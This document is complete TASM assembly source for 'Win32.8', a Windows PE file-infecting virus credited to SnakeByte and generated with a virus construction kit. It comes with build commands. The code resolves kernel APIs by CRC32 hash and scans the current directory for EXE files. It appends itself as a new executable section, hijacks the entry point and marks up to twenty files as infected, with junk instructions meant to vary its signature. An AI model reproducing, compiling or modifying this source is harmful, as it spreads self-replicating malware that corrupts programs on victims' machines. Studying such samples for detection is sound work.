              
;
;
; Win32.8 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.8
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 8
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 37
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 67371 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov ecx, dword ptr [esp]
                                        ; add esp, 4
 inc esp
 add esp, 3d
                                        ; mov ebp, ecx
 push ecx
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;                  [ ///// * Data * \\\\\ ]

Data:
 NewEIP      dd 0h
 OldBase     dd 400000h
 PEheader    dd 0h
 filemask    db '*.EXE',0
 AlignTemp   dd 0h
 db 'Win32.8 created by SnakeByte',0
 InfCounter  dd 0h
 ATableVA    dd 0h
 NewSize     dd 0h
 Trash1      dd 0h
 AlignReg2   dd 0h
 KernelMZ    dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.section'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 counter     dw 0h

 APIOffsets:
 XSetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h
 XCreateFileMappingA    dd 0h
 XMapViewOfFile         dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h
 XFindFirstFileA        dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h

 TempAPI     dd 0h
 KernelPE    dd 0h
 AlignReg1   dd 0h
 OTableVA    dd 0h
 filealign   dd 0h
 Attributes  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 FileHandle  dd 0h


 APINames:
 dd 03C19E536h           ; SetFileAttributesA
 dd 094524B42h           ; UnmapViewOfFile
 dd 0AA700106h           ; FindNextFileA
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0797B49ECh           ; MapViewOfFile
 dd 0C200BE21h           ; FindClose
 dd 068624A9Dh           ; CloseHandle
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 08C892DDFh           ; CreateFileA

 FindHandle  dd 0h
 NTableVA    dd 0h
 MapAddress  dd 0h
 APICRC32    dd 0h
 OldEIP      dd 0h
 sectionalign   dd 0h
 MapHandle   dd 0h
 Misc1       dd 0h
 TempApisearch2 dd 0h




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear edi
 mov edi, 30505d
 sub edi, 30505d
 xor edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [edi+3Ch]
 add esi, edi
                                        ; get File Alignment
 mov ecx, [esi+3Ch]
 mov dword ptr [ebp+filealign], 0
 add dword ptr [ebp+filealign], ecx
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, esi
 add eax, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], 0
 add dword ptr [ebp+PEheader], eax
                                        ; get old Entrypoint
 mov ebx, dword ptr [eax+34h]
 mov dword ptr [ebp+OldBase], ebx
 mov ecx, dword ptr [eax+28h]
 mov dword ptr [ebp+OldEIP], ecx
 not ebx                                ; Trash
 mov ebx, [eax+38h]
 mov dword ptr [ebp+sectionalign], 0
 add dword ptr [ebp+sectionalign], ebx
                                        ; Get last section
 mov edx, [eax+74h]
 shl edx, 3
                                        ; clear ecx
 mov ecx, 0
 mov cx, word ptr [eax+6h]
 mov edi, 28h
 pushad
 mov eax, ecx
 mul edi
 mov dword ptr [ebp+Misc1], eax
 popad
                                        ; mov ecx, -1
 mov ecx, ( -1d xor 39d )
 xor ecx, 39d
 and ecx, dword ptr [ebp+Misc1]
 add eax, 78h
 add eax, edx
 add eax, ecx
 mov ebx, offset newsection
 add ebx, ebp


 xchg ebx, eax
 push ebx
                                        ; Calculate the RVA of the new section
 mov edx, [ebx-5*8+8d]
 add edx, [ebx-5*8+12d]
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], edx
 push eax
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+nsphysicalsize], -1
 and dword ptr [ebp+nsphysicalsize], edx
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], eax
                                        ;  calculate the virtual size of the new section
 mov edx, dword ptr [ebp + offset sectionalign]
 push VirusSize
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], edx
 Call Align
                                        ; mov ecx, -1
 mov ecx, -1d
 and ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], ecx
                                        ; calculate physical offset
 mov ecx,[ebx-5*8+20d]
 add ecx,[ebx-5*8+16d]
 mov eax,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], eax
 Call Align
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], 0
 xor dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
 mov ecx, dword ptr [ebp+filealign]
 mov ebx, edx
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+AlignReg1], ebx
 call Align
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
                                        ; mov eax, 64
 mov eax, ( 64d - 37d )
 add eax, 37d
 pop ecx
 lea ebx, [ebp+newsection]

WriteNewSectionLoop:
 mov dl, byte ptr [ebx]
 mov byte ptr [ecx], dl
 dec eax
                                        ; add ebx, 1
 sub ebx, -1d
                                        ; add ecx, 1
 sub ecx, -1d
 test eax, eax
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 mov ebx, dword ptr [ebp+PEheader]
 sub word ptr [ebx+06h], -1
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [ebx+28h], edx
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], '8'
                                        ; clear eax
 and eax, 0
 xor eax, dword ptr [ebp+nsphysicaloffset]
 push eax
                                        ; Append Virus
 pop edi
 lea eax, [ebp+Virus]
 xchg esi, eax

 mov ecx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [ebp+InfCounter]
 sub ecx, 1
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 pop ebx
 stc
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov edx, offset WFD_szFileName
 add edx, ebp

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ebx, 128
 mov ebx, ( 128d - 16d )
 add ebx, 16d
 push ebx
 lea eax, [ebp+WFD_szFileName]


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 test eax, eax
 jz NoInfection
                                        ; check for maximum filesize
 lea edx, [ebp+WFD_nFileSizeHigh]
 xchg eax, edx

 cmp dword ptr [eax], 0
 jne NoInfection
                                        ; check for minimum filesize
                                        ; mov ebx, -1
 mov ebx, 0
 add ebx, -1d
 and ebx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ebx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear ecx
 mov ecx, 0
 add ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 je Notagoodfile
 push dword ptr [ecx+3Ch]
 pop edx
                                        ; check if header lies inside the file
 cmp edx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edx, ecx
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [edx]
 cmp eax, 'EP'
 je Goodfile2
                                        ; mov eax, 40977
 push 40977d
 pop eax
 cmp eax, 40977d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], '8'
 jz Notagoodfile
                                        ; check for OBJ
 mov bx, word ptr [edx+16h]
 and bx, 00002h
 cmp bx, 00002h
 jne Notagoodfile
 mov dword ptr [ebp+Trash1], 1716276    ; Trash
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov eax, dword ptr [ebp+Attributes]
 push eax
 lea esi, [ebp+WFD_szFileName]
 xchg esi, eax

 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad


                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; clear eax
 push 0
 pop eax
 add eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 and esi, 0
 add esi, [eax+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 add esi, 28d
                                        ; get ATableVA
 mov eax, dword ptr [esi]
 add eax, [ebp+KernelMZ]
                                        ; add esi, 4
 add esi, 4d
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [esi]
                                        ; add esi, 4
 add esi, 4d
 add eax, [ebp+KernelMZ]
 dec dword ptr [ebp+Trash1]             ; Trash
 mov dword ptr [ebp+NTableVA], eax
False add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
 mov edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push edx
 mov ebx, dword ptr [edx]
 add ebx, [ebp+KernelMZ]
                                        ; mov edx, ebx
 mov edx, ebx
                                        ; mov esi, ebx
 mov esi, ebx
 mov dword ptr [ebp+TempApisearch2], esi
 push ecx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ecx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov eax, dword ptr [ebp+APICRC32]
 sub eax, dword ptr [ecx]
 cmp eax, 0
 je FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop ecx
 pop edx
                                        ; mov esi, -1
 mov esi, 0
 add esi, -1d
 and esi, dword ptr [ebp+TempApisearch2]
                                        ; add edx, 4
 add edx, 4d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 mov edx, ebx
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [edx]
 sal ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [ebx]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], 0
 xor dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov eax, -1
 mov eax, ( -1d + 8d )
 sub eax, 8d
 and eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], eax

 mov ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 jmp edx



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 and ebx, 0

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 inc ebx
 push ebx
 mov ebx, 80000000h or 40000000h
 push ebx
 lea edx, [ebp+WFD_szFileName]

 push edx
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx

                                        ; clear ecx
 and ecx, 0
 push ecx
 push edx
 push ecx
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz CloseFile
                                        ; clear ebx
 mov ebx, 0
 push edx
 push ebx
 push ebx
                                        ; mov ecx, 2
 mov ecx, ( 2d xor 28d )
 xor ecx, 28d
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop eax
 push eax
                                        ; round to pages
 mov ax, 0h
                                        ; add eax, 1
 inc eax
 sub edx, 64149251d                     ; Trash
GetKernelLoop:
                                        ; clear ecx
 xor ecx, ecx
 sub eax, 1
 mov cx, word ptr [eax+03ch]
 cmp cx,0f800h
 je GetKernelLoop
 cmp eax, dword ptr [eax+ecx+34h]
 jnz GetKernelLoop
 and edx, ecx                           ; Trash
 mov dword ptr [ebp+KernelMZ], eax
                                        ; add eax, 60
 inc eax
 add eax, 59d
 mov ebx, [eax]
 inc eax
 sub eax, 61d
 add ebx, eax
 mov [KernelPE+ebp], ebx

 jmp GetApis

;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; clear ecx
 mov ecx, 43192d
 sub ecx, 43192d
 add ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx

 push dword ptr [ebp+OldEIP]
 pop ecx

 mov dword ptr [ebp+retEIP], ecx




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea edx, [ebp+filemask]
 xchg esi, edx

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 cmp ecx, 0
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov ecx, esi
 push esi
 pop ecx
LenCRC:
                                        ; add ecx, 1
 add ecx, 1d
 cmp byte ptr [ecx], 0
 jne LenCRC
 sub ecx, esi
                                        ; mov edi, ecx
 mov edi, ecx
                                        ; add edi, 1
 add edi, 1d
 cld
                                        ; clear edx
 push 0
 pop edx
 add edx, -1
                                        ; mov eax, edx
 push edx
 pop eax
NextByteCRC:
                                        ; clear ecx
 mov ecx, -38140d
 add ecx, 38140d
                                        ; clear ebx
 mov ebx, 30276d
 sub ebx, 30276d
 mov cl, byte ptr [esi]
                                        ; add esi, 1
 add esi, 1d
 xor cl, dl
 mov dl, dh
 mov dh, al
 mov al, ah
 mov ah, 8
NextBitCRC:
 shr bx, 1
 rcr cx, 1
jnc NoCRC
 xor cx,08320h
 xor bx,0EDB8h
NoCRC:
 dec ah
jnz NextBitCRC
 xor edx, ecx
 xor eax, ebx
 dec edi
jnz NextByteCRC
 not eax
 not edx
 mov ecx, eax
 rol ecx, 16d
 mov cx, dx
 mov dword ptr [ebp+APICRC32], ecx
 popad
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov eax, NumberOfApis

                                        ; load API Names and Offsets
 lea edx, [ebp+APINames]
 xchg edx, ecx

 lea esi, [ebp+APIOffsets]


GetApisLoop: 

                                        ; search 'em
                                        ; ecx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add ecx, 4
 add ecx, 4d
 mov edx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], edx
                                        ; add esi, 4
 add esi, 4d
 dec eax
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edx, [ebp+WFD_szFileName]
 xchg edx, eax

                                        ; mov ecx, 276
 mov ecx, ( 276d + 33d )
 sub ecx, 33d

ClearOldData2:
 mov byte ptr [eax], 0h
                                        ; add eax, 1
 inc eax
 dec ecx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov ecx, offset WIN32_FIND_DATA
 add ecx, ebp

 push ecx
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov edx, offset WIN32_FIND_DATA
 add edx, ebp

 push edx
 push dword ptr [ebp+FindHandle]
 pop ecx
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret





;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, -47593d
 add edx, 47593d
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignTemp], eax
 div ebx
 sub ebx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

